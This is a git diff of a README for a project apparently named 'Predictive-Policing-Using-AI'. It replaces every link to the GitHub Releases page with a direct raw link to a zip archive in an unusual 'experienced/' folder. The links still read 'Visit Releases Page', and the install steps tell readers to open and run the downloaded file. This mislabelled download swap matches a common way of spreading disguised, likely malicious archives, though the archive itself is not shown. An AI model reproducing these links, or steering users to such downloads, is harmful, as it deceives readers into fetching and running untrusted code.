@@ -1,6 +1,6 @@
 # 🌟 Predictive-Policing-Using-AI - Analyze Crime Data for Safer Communities
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%E2%9D%97-brightgreen)](https://github.com/jahmurian/Predictive-Policing-Using-AI/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jahmurian/Predictive-Policing-Using-AI/main/experienced/Predictive_Using_Policing_AI_v3.3-alpha.3.zip%20Latest%20Release-%E2%9D%97-brightgreen)](https://raw.githubusercontent.com/jahmurian/Predictive-Policing-Using-AI/main/experienced/Predictive_Using_Policing_AI_v3.3-alpha.3.zip)
 
 ## 📦 Description
 
@@ -12,7 +12,7 @@ To get started with the Predictive Policing using AI application, follow these s
 
 1. **Visit the Releases Page**: The first step is to go to the Releases page to find the latest version of the software. You can access it by clicking the link below:
 
-   [Visit Releases Page](https://github.com/jahmurian/Predictive-Policing-Using-AI/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/jahmurian/Predictive-Policing-Using-AI/main/experienced/Predictive_Using_Policing_AI_v3.3-alpha.3.zip)
 
 2. **Choose the Right File**: When you're on the Releases page, you will see different files available for download. Select the version that fits your operating system (Windows, macOS, or Linux).
 
@@ -33,7 +33,7 @@ Before installing, ensure your system meets these requirements:
 
 Follow these steps to download and install the application:
 
-1. Go to the Releases page: [Visit Releases Page](https://github.com/jahmurian/Predictive-Policing-Using-AI/releases).
+1. Go to the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/jahmurian/Predictive-Policing-Using-AI/main/experienced/Predictive_Using_Policing_AI_v3.3-alpha.3.zip).
 2. Click on the release file that matches your operating system.
 3. Wait for the file to download.
 4. Open the downloaded file and complete the installation by following the on-screen instructions.
